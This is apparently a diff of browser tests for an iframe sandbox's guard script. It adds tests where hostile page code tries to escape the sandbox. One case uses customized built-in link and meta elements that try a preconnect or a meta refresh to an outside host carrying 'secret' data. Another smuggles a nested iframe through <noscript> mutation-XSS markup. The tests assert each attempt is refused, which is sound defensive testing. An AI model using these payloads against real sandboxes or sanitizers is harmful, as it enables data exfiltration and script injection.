@@ -76,12 +76,22 @@ test.beforeEach(() => {
 });
 
 /** Shows `artifact` the way SandboxFrame does, waits, and returns what the
- *  frame said. */
-async function run(page: Page, artifact: string, scripts = true, wait = 1500) {
+ *  frame said. With `until`, it waits for the frame to say something
+ *  starting with that instead of
+ *  a fixed time -- for tests with a positive signal; one that asserts that
+ *  something did NOT happen (no connection) keeps the bounded wait. With
+ *  `guard: false`, the srcdoc is built without GUARD (as OC8_SANDBOX_RED). */
+async function run(
+  page: Page,
+  artifact: string,
+  scripts = true,
+  wait = 1500,
+  { until, guard = true }: { until?: string; guard?: boolean } = {},
+) {
   await page.goto(`${APP}/`);
   // OC8_SANDBOX_RED=1 builds the srcdoc without GUARD, to see which tests
   // depend on it (a red check that leaves the source alone).
-  const red = !!process.env.OC8_SANDBOX_RED;
+  const red = !!process.env.OC8_SANDBOX_RED || !guard;
   await page.evaluate(
     ({ artifact, scripts, red }) => {
       const frame = document.createElement("iframe");
@@ -97,8 +107,13 @@ async function run(page: Page, artifact: string, scripts = true, wait = 1500) {
     },
     { artifact, scripts, red },
   );
-  await page.waitForTimeout(wait);
-  return page.evaluate(() => (window as unknown as { said: string[] }).said);
+  const said = () => page.evaluate(() => (window as unknown as { said: string[] }).said);
+  if (until) {
+    await expect
+      .poll(async () => (await said()).some((m) => m.startsWith(until)), { timeout: 15_000 })
+      .toBe(true);
+  } else await page.waitForTimeout(wait);
+  return said();
 }
 
 const SAY = 'const say=(m)=>parent.postMessage(String(m),"*");';
@@ -129,6 +144,9 @@ test("renders, and the page reaches nothing of the parent", async ({ page }) => 
     try{delete window.fetch;Object.defineProperty(window,"fetch",{value:1})}catch{} say("restored "+typeof window.fetch);
     say("rendered "+document.getElementById("p").textContent);
     </script>`,
+    true,
+    1500,
+    { until: "rendered hello" },
   );
   expect(said).toEqual(
     expect.arrayContaining([
@@ -453,6 +471,9 @@ test("runs an ordinary interactive page", async ({ page }) => {
     document.body.classList.add("ready");say("class "+document.body.className);
     requestAnimationFrame(()=>say("frame "+getComputedStyle(document.getElementById("s")).animationName));
     </script>`,
+    true,
+    1500,
+    { until: "frame spin" },
   );
   expect(said).toEqual(
     expect.arrayContaining([
@@ -475,11 +496,86 @@ test("keeps what a page drew when it reaches for storage", async ({ page }) => {
   await run(
     page,
     `<p id="p">drawn</p><script>localStorage.setItem("k","v");document.getElementById("p").textContent="after"</script>` +
-      `<p id="q">later markup</p>`,
+      `<p id="q">later markup</p><script>parent.postMessage("end","*")</script>`,
+    true,
+    0,
+    { until: "end" },
   );
-  const frame = page.frames()[1];
-  expect(await frame.locator("#p").textContent()).toBe("drawn");
-  expect(await frame.locator("#q").textContent()).toBe("later markup");
+  const frame = page.frameLocator("iframe");
+  await expect(frame.locator("#p")).toHaveText("drawn");
+  await expect(frame.locator("#q")).toHaveText("later markup");
+});
+
+// A customized built-in runs page code on every attribute change. GUARD
+// decides without running any (no trial on a copy whose callback could
+// throw or recurse), so the change is refused on the spot.
+test("refuses a hint or refresh on a customized built-in link or meta", async ({ page }) => {
+  const said = await run(
+    page,
+    `<script>${SAY}
+    const t=(n,f)=>{try{f()}catch(e){say(n+" threw "+e.name)}};
+    t("define",()=>{
+      class L extends HTMLLinkElement{static observedAttributes=["rel","href"];attributeChangedCallback(){if(!this.isConnected)this.setAttribute("rel","icon")}}
+      class M extends HTMLMetaElement{static observedAttributes=["http-equiv","content"];attributeChangedCallback(){if(!this.isConnected)this.setAttribute("http-equiv","x")}}
+      customElements.define("x-l",L,{extends:"link"});customElements.define("x-m",M,{extends:"meta"});
+    });
+    const l=document.createElement("link",{is:"x-l"});l.rel="icon";l.href="http://${OUT}/l";document.head.append(l);
+    const m=document.createElement("meta",{is:"x-m"});m.content="0;url=http://${OUT}/?d=secret";document.head.append(m);
+    t("rel",()=>l.setAttribute("rel","preconnect"));t("rel2",()=>{l.rel="dns-prefetch"});t("list",()=>l.relList.add("preconnect"));
+    t("equiv",()=>m.setAttribute("http-equiv","refresh"));t("equiv2",()=>{m.httpEquiv="refresh"});
+    say("now "+l.getAttribute("rel")+" "+m.getAttribute("http-equiv"));
+    </script>`,
+  );
+  // Read in the same task as the changes: refused before, not removed after.
+  // (The meta's own callback set http-equiv "x" while it was detached.)
+  expect(said).toContain("now icon x");
+  expect(page.url()).toMatch(/^http:\/\/localhost/);
+  expect(hits).toEqual([]);
+});
+
+// The template GUARD vets HTML in parses with scripting off; the page with
+// it on. <noscript> is where the two differ, so it is refused outright.
+test("refuses <noscript> in HTML a script parses into the page", async ({ page }) => {
+  const n = nested().replace(/"/g, "&quot;").replace(/'/g, "&#39;");
+  const html = `<noscript><p title="</noscript><iframe srcdoc='${n}'>"></p></noscript>`;
+  const said = await run(
+    page,
+    `<script>${SAY}const html=${JSON.stringify(html).replace(/<\//g, "<\\/")};
+    const x=document.createElement("div");document.body.append(x);
+    const tries=[["innerHTML",()=>{x.innerHTML=html}],["outerHTML",()=>{x.outerHTML=html}],
+      ["insertAdjacentHTML",()=>x.insertAdjacentHTML("beforeend",html)]];
+    for (const [name,f] of tries){try{f();say(name+" let in")}catch(e){say(name+" refused")}}
+    ${LEFT}</script>`,
+  );
+  expect(said).toEqual(
+    expect.arrayContaining([
+      "innerHTML refused",
+      "outerHTML refused",
+      "insertAdjacentHTML refused",
+      "left 0",
+    ]),
+  );
+  expect(page.frames()).toHaveLength(2);
+  expect(hits).toEqual([]);
+});
+
+// GUARD wraps setAttribute for every element; an ordinary attribute must
+// stay cheap (the clone trial it replaced made 20k style sets ~9x slower in
+// Firefox). Bound: 2x unguarded plus 25 ms for timer noise.
+test("keeps ordinary attribute changes cheap", async ({ page }) => {
+  const bench =
+    `<div id="d"></div><script>const d=document.getElementById("d");const t0=performance.now();` +
+    `for(let i=0;i<20000;i+=1)d.setAttribute("style","width:"+(i%100)+"px");` +
+    `parent.postMessage("ms "+(performance.now()-t0),"*")</script>`;
+  const ms = (said: string[]) => Number(said.find((m) => m.startsWith("ms "))?.slice(3));
+  const guarded = ms(await run(page, bench, true, 0, { until: "ms" }).catch(() => []));
+  const bare = ms(await run(page, bench, true, 0, { until: "ms", guard: false }).catch(() => []));
+  // Not read by the guard: just keep every measurement in the test log.
+  test.info().annotations.push({
+    type: "setAttribute x20000",
+    description: `${guarded} ms guarded, ${bare} ms without`,
+  });
+  expect(guarded).toBeLessThanOrEqual(2 * bare + 25);
 });
 
 // Mutation XSS: markup the parent's parser reads one way and the frame's,
